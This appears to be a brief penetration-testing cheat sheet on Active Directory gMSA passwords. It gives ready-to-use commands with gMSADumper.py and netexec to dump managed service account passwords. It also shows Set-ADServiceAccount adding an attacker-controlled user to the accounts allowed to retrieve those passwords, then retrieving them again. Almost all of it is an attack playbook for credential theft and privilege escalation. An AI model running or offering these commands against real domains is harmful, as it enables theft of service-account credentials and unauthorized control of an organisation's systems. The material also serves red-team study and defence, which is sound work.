# gMSA Passwords:

Find users controled by gMSA Passwords (externaly from your machine), it also check users who can revel the passwords.

`gMSADumper.py -u <user you control> -p <password> -d <domain>` 
<br>
`nxc ldap <ip> -u <user you control> -p <password> --gmsa`

<br>

If you have access to a internal powershell session (evil-winrm, for example) you can also check this information for a particular user:

`Get-ADServiceAccount -Identity <user controlled by gMSA Passwords> -Properties PrincipalsAllowedToRetrieveManagedPassword`

<br>

In case you have access, and permisions inside powershell session you can include yourself into the list of users who can revel the passwords:

`Set-ADServiceAccount -Identity <user controlled by gMSA Passwords> -PrincipalsAllowedToRetrieveManagedPassword <user you control>`


Then try to retrive passwords again with gMSADumper.py or netexec.
